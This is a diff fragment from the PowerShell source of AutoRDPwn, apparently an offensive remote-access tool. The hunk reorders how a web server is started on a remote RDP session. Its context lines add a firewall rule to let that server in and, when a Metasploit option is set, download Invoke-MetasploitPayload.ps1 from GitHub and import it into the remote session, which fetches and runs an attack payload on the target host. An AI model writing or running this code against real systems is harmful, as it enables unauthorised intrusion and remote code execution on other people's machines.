@@ -609,7 +609,7 @@ netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=a
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
-invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer} (New-Object -Com Shell.Application).Open("http://$computer`:8080")}
+(New-Object -Com Shell.Application).Open("http://$computer`:8080") ; invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}
 
 if ($metasploit){ $metascript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-MetasploitPayload.ps1')
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:metascript -Path Invoke-MetasploitPayload.ps1 ; Import-Module .\Invoke-MetasploitPayload.ps1 ; Write-Host
